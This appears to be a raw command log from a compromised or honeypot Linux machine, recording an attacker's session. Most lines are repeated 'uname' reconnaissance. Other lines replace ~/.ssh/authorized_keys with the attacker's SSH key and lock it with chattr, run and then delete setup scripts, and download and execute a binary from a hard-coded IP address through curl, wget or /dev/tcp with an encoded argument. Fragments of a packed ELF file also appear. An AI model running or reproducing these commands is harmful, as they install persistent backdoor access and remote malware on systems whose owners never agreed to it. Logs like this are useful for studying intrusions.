uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
echo 1 > /dev/null && cat /bin/echo
nohup $SHELL -c "curl http://47.243.28.171:60133/linux -o /tmp/UAyUCzpvsL; if [ ! -f /tmp/UAyUCzpvsL ]; then wget http://47.243.28.171:60133/linux -O /tmp/UAyUCzpvsL; fi; if [ ! -f /tmp/UAyUCzpvsL ]; then exec 6<>/dev/tcp/47.243.28.171/60133 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/UAyUCzpvsL ; chmod +x /tmp/UAyUCzpvsL && /tmp/UAyUCzpvsL f8GyjDQzsRvVxP5h4jn1bfrFyh+0ISKVtNMAHNCxjzQwsR/Bw/xm/THsZvnB1Ra1LyKIqNkIBNG3jy8hsBjVwvp5/jXiZvrBwRm0MCmIptAHBs+/ijQ5twHKxPZh/DH/YuzHyRyqMyuLqNALHNi8jSowth/bzeJl/TDiYvzbzRq+NyqKtNcSBtaogywvthbVxP1u9jb8ZvjA2xuzLyiPtM8DAtmojCs7sh/Kxft3/Tj+ef7FyAGxLymDvNcCA9G/mys2sQHKwvR5/TnibvTPzR+1My2bstYcCtKoiig1qh7JxPZh/DH8YuzEyhaqNjSJtNMcA9GwgSwxtR3L1f9u4jH8YuLEyBmqMyqPvNcCA9O2my42qh7KzOJk+C79ZPTPzR+1Mi+bstYcBdeojCMvth3Lz/pn/TT9d/jC1R2wMjSJvs8DBdC8jSowtxzbxP1m4jX/ef7FzAGwMyCNttAAAsGyjjQ3sgHKwPt5/TT7bfrFyh61ISuDtM8AAtKojjQyvBXNxf1n9SD4YOLHzxyqMyKVt9YDCNe2iikypBfVx/1g4jL9ef3CzhWyMSuLv8EDBNWojigvth7M2/1i/jr6Z/3Eyg+1MCuVt9YCHNKwlSs0sxXNxf1l/iD0ef3HwgG1MSuVtNEIBNG3iSshsBjVwvp5+zjiZvrFwRm0MCqOptUFHNOyiDQ2tAHJwfxt+jD9ZvnVzxiqNiyVsdgcANO2gSwxtRvK1f1m9S77ef7HyQG1MSyBsNEDANGmjy0vthvI2/1l+y79Y/zPzR+1NSl/+CPrbWZ7YcjXH1j1pjkP0yIzTv9nd1ClGU2Fng==; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/UAyUCzpvsL && /tmp/UAyUCzpvsL f8GyjDQzsRvVxP5h4jn1bfrFyh+0ISKVtNMAHNCxjzQwsR/Bw/xm/THsZvnB1Ra1LyKIqNkIBNG3jy8hsBjVwvp5/jXiZvrBwRm0MCmIptAHBs+/ijQ5twHKxPZh/DH/YuzHyRyqMyuLqNALHNi8jSowth/bzeJl/TDiYvzbzRq+NyqKtNcSBtaogywvthbVxP1u9jb8ZvjA2xuzLyiPtM8DAtmojCs7sh/Kxft3/Tj+ef7FyAGxLymDvNcCA9G/mys2sQHKwvR5/TnibvTPzR+1My2bstYcCtKoiig1qh7JxPZh/DH8YuzEyhaqNjSJtNMcA9GwgSwxtR3L1f9u4jH8YuLEyBmqMyqPvNcCA9O2my42qh7KzOJk+C79ZPTPzR+1Mi+bstYcBdeojCMvth3Lz/pn/TT9d/jC1R2wMjSJvs8DBdC8jSowtxzbxP1m4jX/ef7FzAGwMyCNttAAAsGyjjQ3sgHKwPt5/TT7bfrFyh61ISuDtM8AAtKojjQyvBXNxf1n9SD4YOLHzxyqMyKVt9YDCNe2iikypBfVx/1g4jL9ef3CzhWyMSuLv8EDBNWojigvth7M2/1i/jr6Z/3Eyg+1MCuVt9YCHNKwlSs0sxXNxf1l/iD0ef3HwgG1MSuVtNEIBNG3iSshsBjVwvp5+zjiZvrFwRm0MCqOptUFHNOyiDQ2tAHJwfxt+jD9ZvnVzxiqNiyVsdgcANO2gSwxtRvK1f1m9S77ef7HyQG1MSyBsNEDANGmjy0vthvI2/1l+y79Y/zPzR+1NSl/+CPrbWZ7YcjXH1j1pjkP0yIzTv9nd1ClGU2Fng==" &
head -c 3800636 > /tmp/WEJQvcBAS7
nohup $SHELL -c "curl http://47.243.28.171:60133/linux -o /tmp/UAyUCzpvsL; if [ ! -f /tmp/UAyUCzpvsL ]; then wget http://47.243.28.171:60133/linux -O /tmp/UAyUCzpvsL; fi; if [ ! -f /tmp/UAyUCzpvsL ]; then exec 6<>/dev/tcp/47.243.28.171/60133 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/UAyUCzpvsL ; chmod +x /tmp/UAyUCzpvsL && /tmp/UAyUCzpvsL f8GyjDQzsRvVxP5h4jn1bfrFyh+0ISKVtNMAHNCxjzQwsR/Bw/xm/THsZvnB1Ra1LyKIqNkIBNG3jy8hsBjVwvp5/jXiZvrBwRm0MCmIptAHBs+/ijQ5twHKxPZh/DH/YuzHyRyqMyuLqNALHNi8jSowth/bzeJl/TDiYvzbzRq+NyqKtNcSBtaogywvthbVxP1u9jb8ZvjA2xuzLyiPtM8DAtmojCs7sh/Kxft3/Tj+ef7FyAGxLymDvNcCA9G/mys2sQHKwvR5/TnibvTPzR+1My2bstYcCtKoiig1qh7JxPZh/DH8YuzEyhaqNjSJtNMcA9GwgSwxtR3L1f9u4jH8YuLEyBmqMyqPvNcCA9O2my42qh7KzOJk+C79ZPTPzR+1Mi+bstYcBdeojCMvth3Lz/pn/TT9d/jC1R2wMjSJvs8DBdC8jSowtxzbxP1m4jX/ef7FzAGwMyCNttAAAsGyjjQ3sgHKwPt5/TT7bfrFyh61ISuDtM8AAtKojjQyvBXNxf1n9SD4YOLHzxyqMyKVt9YDCNe2iikypBfVx/1g4jL9ef3CzhWyMSuLv8EDBNWojigvth7M2/1i/jr6Z/3Eyg+1MCuVt9YCHNKwlSs0sxXNxf1l/iD0ef3HwgG1MSuVtNEIBNG3iSshsBjVwvp5+zjiZvrFwRm0MCqOptUFHNOyiDQ2tAHJwfxt+jD9ZvnVzxiqNiyVsdgcANO2gSwxtRvK1f1m9S77ef7HyQG1MSyBsNEDANGmjy0vthvI2/1l+y79Y/zPzR+1NSl/+CPrbWZ7YcjXH1j1pjkP0yIzTv9nd1ClGU2Fng==; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/UAyUCzpvsL && /tmp/UAyUCzpvsL f8GyjDQzsRvVxP5h4jn1bfrFyh+0ISKVtNMAHNCxjzQwsR/Bw/xm/THsZvnB1Ra1LyKIqNkIBNG3jy8hsBjVwvp5/jXiZvrBwRm0MCmIptAHBs+/ijQ5twHKxPZh/DH/YuzHyRyqMyuLqNALHNi8jSowth/bzeJl/TDiYvzbzRq+NyqKtNcSBtaogywvthbVxP1u9jb8ZvjA2xuzLyiPtM8DAtmojCs7sh/Kxft3/Tj+ef7FyAGxLymDvNcCA9G/mys2sQHKwvR5/TnibvTPzR+1My2bstYcCtKoiig1qh7JxPZh/DH8YuzEyhaqNjSJtNMcA9GwgSwxtR3L1f9u4jH8YuLEyBmqMyqPvNcCA9O2my42qh7KzOJk+C79ZPTPzR+1Mi+bstYcBdeojCMvth3Lz/pn/TT9d/jC1R2wMjSJvs8DBdC8jSowtxzbxP1m4jX/ef7FzAGwMyCNttAAAsGyjjQ3sgHKwPt5/TT7bfrFyh61ISuDtM8AAtKojjQyvBXNxf1n9SD4YOLHzxyqMyKVt9YDCNe2iikypBfVx/1g4jL9ef3CzhWyMSuLv8EDBNWojigvth7M2/1i/jr6Z/3Eyg+1MCuVt9YCHNKwlSs0sxXNxf1l/iD0ef3HwgG1MSuVtNEIBNG3iSshsBjVwvp5+zjiZvrFwRm0MCqOptUFHNOyiDQ2tAHJwfxt+jD9ZvnVzxiqNiyVsdgcANO2gSwxtRvK1f1m9S77ef7HyQG1MSyBsNEDANGmjy0vthvI2/1l+y79Y/zPzR+1NSl/+CPrbWZ7YcjXH1j1pjkP0yIzTv9nd1ClGU2Fng==" &#UPX!
>A@/1'8ELF7}
uname -s -m
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -m
uname -s -m
uname -s -m
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -m
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
